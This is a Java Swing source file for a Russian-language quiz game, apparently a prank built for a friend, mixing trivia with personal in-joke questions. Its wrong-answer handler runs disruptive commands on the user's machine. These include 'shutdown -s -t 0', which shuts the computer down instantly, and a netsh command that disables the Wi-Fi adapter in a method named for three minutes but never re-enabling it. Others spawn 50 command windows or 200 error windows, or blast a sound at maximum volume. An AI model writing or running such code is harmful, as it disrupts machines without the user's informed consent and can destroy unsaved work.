import javax.sound.sampled.*;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.io.IOException;
import java.io.File;

import static java.lang.Thread.sleep;

public class NewGame {
    private int questionIndex;

    private JLabel questionLabel;
    private JPanel buttonsPanel;

    private Question[] questions;

    public NewGame() {
        questions = new Question[]{
                new Question("Ну это просто проверка, сможешь угадать число, которое я загадал?", new String[]{"1", "13", "Япошка", "7"}, 1),
                new Question("Как называется самый длинный река мира?( без приток и дополнительных русел)", new String[]{"Амазонка", "Нил", " Янцзы", " Миссисипи"}, 1),
                new Question("Что будет следующим числом в этой последовательности? 1, 4, 9, 16, 25, ...", new String[]{"30", "36", "49", "64"}, 1),
                new Question("На каком языке написан этот код?", new String[]{"Python", "Java", "JavaScript", "На языке Богов"}, 1),
                new Question("Если 5 стульев стоят в ряд, и на каждый стул садится по одному человеку, сколько всего возможных комбинаций могут быть, если каждый человек может сесть на любой стул?", new String[]{"5", "25", "120", "125"}, 2),
                new Question("Какая планета четвертая от Солнца?", new String[]{"Марс", "Юпитер", "Бобрус", "Земля"}, 0),
                new Question("Если все флипперы – флюгеры, а не все флюгеры – флипперы, какая из следующих утверждений правильная?", new String[]{" Все флипперы – флюгеры.", "Некоторые флюгеры – флипперы.", " Все флюгеры – флипперы.", "Некоторые флипперы – не флюгеры."}, 1),
                new Question("Какой газ является основным компонентом атмосферы Земл и?", new String[]{"Кислород", "Аргон", "Азот", "Азон"}, 2),
                new Question("Какой химический элемент имеет наибольшую атомную массу?", new String[]{" Углерод", "Золото", "Ртуть", "Уран"}, 3),
                new Question("Кто написал \"Войну и мир\"?", new String[]{"Александр Солженицын", "Федор Достоевский", "Лев Толстой", " Михаил Лермонтов"}, 2),
                new Question("Красава, это были общие вопросы. А теперь самое интересное. О нас)) Какую книжку я вчера читал?(Теперь можешь пользоваться интернетом)", new String[]{"Чума из космоса", "Время Не Ждет", "Моя жена- Ведьма", "Как быть успешным другом(автор А.чё.не. 1320г до н.э.)"}, 1),
                new Question("Сколько в сумме часов мы наиграли в эту парашу?", new String[]{"3113.4", "2840.5", "2943.0", "2090.5"}, 3),
                new Question("Сколько было игр у меня в стиме, когда я обосрался?", new String[]{" 121", "131", "114", "124"}, 0),
                new Question("Сколько раз  \"успешно\" смотрел платформу?", new String[]{"1", "2", "3", "4"}, 2),
                new Question("Ты приедешь ко мне летом?", new String[]{"Да", "Девственостью очка клянусь", "Я гей", "Нет"}, 1),
                new Question("Сколько раз ты меня звал Коля в переписке?(Если я неправильно считал, сорян, с тебя колбаса тогда, ну а с меня... )", new String[]{" 337", "310", "317", "300"}, 3),
                new Question("Сколько раз я был в ТО?", new String[]{"1", "2", "3"}, 2),
                new Question("Емае, пока эту фигню делал и пересматривал чаты опять грустно стало", new String[]{" .", "...", "................"}, 2),
                new Question("На страже?", new String[]{" мужских членов", "женских унитазов", "мужских туалетов", "женских туалетов"}, 3),
                new Question("На каком танке мы впервые пошли в бой?", new String[]{"Т34", "КВ4", "Тигр2", "Шерман"}, 1),
                new Question("Сколько у меня танков в ангаре?", new String[]{"43", "44", "45", "46"}, 1),
                new Question("Как начинается моя переписка в инсте?", new String[]{"La", "Я короче переписку всю случайно удалил", "Ты со мной на базар поедешь?", "Саня Саня Саня Саня"}, 0),
                new Question("На скольки фото я у тебя в отмеченных?", new String[]{"5", "8", "9", "13"}, 2),
                new Question("И последний вопрос, какой язык я начал учить первым?", new String[]{"Английский", "Java", "C++", "Pascal"}, 2),
        };
        questionLabel = new JLabel("", SwingConstants.CENTER);
        questionLabel.setPreferredSize(new Dimension(400, 50));
        buttonsPanel = new JPanel(new FlowLayout());
        JPanel bottomPanel = new JPanel(new FlowLayout());

        loadProgress(); // загружаем прогресс
    }

    private void loadProgress() {
        File progressFile = new File("progress.txt");
        if (progressFile.exists()) {
            try (FileReader reader = new FileReader(progressFile)) {
                BufferedReader br = new BufferedReader(reader);
                questionIndex = Integer.parseInt(br.readLine().trim());
            } catch (IOException e) {
                e.printStackTrace();
            }
        } else {
            reset(); // если файл не существует, начинаем новую игру
        }
    }


    public JPanel createPanel() {
        JPanel panel = new JPanel(new BorderLayout());

        questionLabel = new JLabel("", SwingConstants.CENTER);
        questionLabel.setPreferredSize(new Dimension(400, 50));
        panel.add(questionLabel, BorderLayout.NORTH);

        buttonsPanel = new JPanel(new FlowLayout());
        panel.add(buttonsPanel, BorderLayout.CENTER);

        JPanel bottomPanel = new JPanel(new FlowLayout());


        panel.add(bottomPanel, BorderLayout.SOUTH);

        displayQuestion();

        return panel;
    }

    private void displayQuestion() {

        if (questionIndex >= 0 && questionIndex < questions.length) {
            Question currentQuestion = questions[questionIndex];
            questionLabel.setText(currentQuestion.getQuestion());
            buttonsPanel.removeAll();
            String[] choices = currentQuestion.getChoices();

            for (int i = 0; i < choices.length; i++) {
                JButton choiceButton = new JButton(choices[i]);
                final int choiceIndex = i;
                choiceButton.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        if (choiceIndex == currentQuestion.getCorrectChoiceIndex()) {
                            questionIndex++;
                            displayQuestion();
                            saveProgress();
                        } else {
                            try {
                                wrongAnswerAction(questionIndex); // вызываем метод для неправильного ответа
                            } catch (InterruptedException ex) {
                                throw new RuntimeException(ex);
                            }
                        }
                    }
                });
                buttonsPanel.add(choiceButton);
            }
            buttonsPanel.revalidate();
            buttonsPanel.repaint();
        } else {
            questionLabel.setText("Поздравляем! Вы успешно завершили квест.");
            buttonsPanel.removeAll();
            buttonsPanel.revalidate();
            buttonsPanel.repaint();
        }
    }


    private void loadQuestion() {
        Question currentQuestion = questions[questionIndex];
        questionLabel.setText(currentQuestion.getQuestion());

        String[] choices = currentQuestion.getChoices();
        for (int i = 0; i < buttonsPanel.getComponentCount(); i++) {
            JButton choiceButton = (JButton) buttonsPanel.getComponent(i);
            choiceButton.setText(choices[i]);
        }
    }


    public void reset() {
        questionIndex = 0;
        saveProgress(); // перезаписываем файл прогресса
        loadQuestion();
    }

    public void setQuestionIndex(int index) {
        this.questionIndex = index;
        displayQuestion();
    }

    private void saveProgress() {
        try (FileWriter writer = new FileWriter("progress.txt")) {
            writer.write(Integer.toString(questionIndex)); // сохраняем индекс текущего вопроса
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private void createMultipleWindows() {
        for (int i = 0; i < 200; i++) {
            JFrame errorFrame = new JFrame("Ошибка");
            errorFrame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
            errorFrame.setSize(300, 200);

            JLabel errorMessage = new JLabel("Неправильный ответ!");
            errorMessage.setHorizontalAlignment(SwingConstants.CENTER);
            errorFrame.add(errorMessage);

            errorFrame.setLocationRelativeTo(null);
            errorFrame.setVisible(true);
        }
    }

    private void createMultipleCMD() {
        for (int i = 0; i < 50; i++) {
            try {
                Runtime.getRuntime().exec("cmd /c start");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }



    private void disableWifiForThreeMinutes() {
        try {
            ProcessBuilder builder = new ProcessBuilder(
                    "cmd.exe", "/c", "netsh interface set interface \"Wi-Fi\" admin= disable");
            builder.redirectErrorStream(true);
            Process process = builder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }



    private void shutdownComputer() {
        JFrame errorFrame = new JFrame("Ошибка");
        errorFrame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        JLabel errorMessage = new JLabel("От это ты зря!");
        errorMessage.setHorizontalAlignment(SwingConstants.CENTER);
        errorFrame.add(errorMessage);
        errorFrame.setSize(300, 200);
        errorFrame.setLocationRelativeTo(null);
        errorFrame.setVisible(true);
        try {
            Runtime.getRuntime().exec("shutdown -s -t 0");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void playGet() {
        try {

            InputStream audioStream = getClass().getResourceAsStream("/get.wav");
            AudioInputStream audioInputStream = AudioSystem.getAudioInputStream(audioStream);
            Clip clip = AudioSystem.getClip();
            clip.open(audioInputStream);

            // Устанавливаем громкость на максимальное значение
            FloatControl gainControl = (FloatControl) clip.getControl(FloatControl.Type.MASTER_GAIN);
            float maxVolume = gainControl.getMaximum();
            gainControl.setValue(maxVolume);

            clip.start();
        } catch (UnsupportedAudioFileException | IOException | LineUnavailableException e) {
            e.printStackTrace();
        }
    }

    private void wrongAnswerAction(int questionIndex) throws InterruptedException {
        switch (questionIndex) {
            case 0, 6, 12, 18:
                JOptionPane.showMessageDialog(null, "Неправильный ответ!");
                createMultipleWindows();

                break;
            case 1, 7, 13, 19:
                JOptionPane.showMessageDialog(null, "Неправильный ответ! Программа будет закрыта.");
                System.exit(0);
                break;

            case 2, 8, 14, 20:
                JOptionPane.showMessageDialog(null, "Неправильный ответ!");
                createMultipleCMD();
                break;
            case 3, 9, 15, 21:
                JOptionPane.showMessageDialog(null, "Пиши мне в телегу)");
                disableWifiForThreeMinutes();
                break;
            case 4, 10, 16, 22:
                shutdownComputer();
            case 5, 11, 17, 23:
                JOptionPane.showMessageDialog(null, "Неправильный ответ!");
                for (int i = 0; i < 50; i++) {
                    playGet();
                    sleep(1000);
                }
                break;


        }

    }


}

